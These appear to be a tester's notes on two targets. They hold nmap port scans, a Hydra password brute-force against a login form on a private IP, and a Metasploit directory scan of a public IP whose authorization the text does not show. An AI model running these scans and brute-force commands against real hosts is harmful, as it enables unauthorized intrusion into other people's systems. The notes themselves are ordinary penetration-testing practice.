
## Springboot
### scanning all ports & services

```bash
Host is up (0.00100s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
53/tcp    open  domain     (generic dns response: SERVFAIL)
3306/tcp  open  mysql?
5000/tcp  open  rtsp
7000/tcp  open  rtsp
9898/tcp  open  monkeycom?
35729/tcp open  tcpwrapped
63693/tcp open  unknown

```

### mysql scanner
![[Pasted image 20241203172034.png]]



### password brute force 


```bash
kali㉿kali)-[~]
└─$ hydra -l kieran -P /home/kali/Downloads/10k-most-common.txt 192.168.64.1 http-post-form \
"/login:username=^USER^&password=^PASS^:F=incorrect" -s 9898

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-03 11:41:28
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries (l:1/p:10000), ~625 tries per task
[DATA] attacking http-post-form://192.168.64.1:9898/login:username=^USER^&password=^PASS^:F=incorrect
[9898][http-post-form] host: 192.168.64.1   login: kieran   password: 123456
[9898][http-post-form] host: 192.168.64.1   login: kieran   password: abc123
[9898][http-post-form] host: 192.168.64.1   login: kieran   password: 12345678
[9898][http-post-form] host: 192.168.64.1   login: kieran   password: 1234
[9898][http-post-form] host: 192.168.64.1   login: kieran   password: qwerty
[9898][http-post-form] host: 192.168.64.1   login: kieran   password: 12345
[9898][http-post-form] host: 192.168.64.1   login: kieran   password: dragon
[9898][http-post-form] host: 192.168.64.1   login: kieran   password: pussy
[9898][http-post-form] host: 192.168.64.1   login: kieran   password: baseball
[9898][http-post-form] host: 192.168.64.1   login: kieran   password: football
[9898][http-post-form] host: 192.168.64.1   login: kieran   password: letmein
[9898][http-post-form] host: 192.168.64.1   login: kieran   password: monkey
[9898][http-post-form] host: 192.168.64.1   login: kieran   password: 696969
[9898][http-post-form] host: 192.168.64.1   login: kieran   password: michael
[9898][http-post-form] host: 192.168.64.1   login: kieran   password: mustang
[9898][http-post-form] host: 192.168.64.1   login: kieran   password: password
1 of 1 target successfully completed, 16 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-03 11:41:29

```

## Lavarel app
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p1-65535 45.86.36.184

Not shown: 63859 filtered tcp ports (no-response), 1670 filtered tcp ports (host-prohibited), 1 filtered tcp ports (port-unreach)
PORT     STATE  SERVICE        VERSION
21/tcp   closed ftp
22/tcp   open   ssh            OpenSSH 8.7 (protocol 2.0)
80/tcp   open   http           Apache httpd
443/tcp  closed https
7979/tcp closed micromuse-ncps

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2143.34 seconds
```


#### Scanning directories

```bash
msf6 auxiliary(scanner/http/dir_scanner) > run

[*] Detecting error code
[*] Using code '404' as not found for 45.86.36.184
[+] Found http://45.86.36.184:80/.cache/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/.bash_history/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/.cvs/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/.bashrc/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/.git/HEAD/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80// 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/.htaccess/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/.cvsignore/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/.hta/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/.forward/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/.config/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/.listing/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/.history/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/.listings/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/.htpasswd/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/.mysql_history/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/.sh_history/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/.rhosts/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/.passwd/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/.perf/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/.profile/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/.svn/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/.ssh/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/.subversion/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/.svn/entries/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/.swf/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/.web/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/app/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/cgi-bin/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/cgi-bin// 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/config/ 404 (45.86.36.184)
[+] Found http://45.86.36.184:80/database/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/Documents and Settings/ 400 (45.86.36.184)
[+] Found http://45.86.36.184:80/error/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/Program Files/ 400 (45.86.36.184)
[+] Found http://45.86.36.184:80/public/ 200 (45.86.36.184)
[+] Found http://45.86.36.184:80/reports list/ 404 (45.86.36.184)
[+] Found http://45.86.36.184:80/resources/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/routes/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/storage/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/tests/ 403 (45.86.36.184)
[+] Found http://45.86.36.184:80/vendor/ 403 (45.86.36.184)


```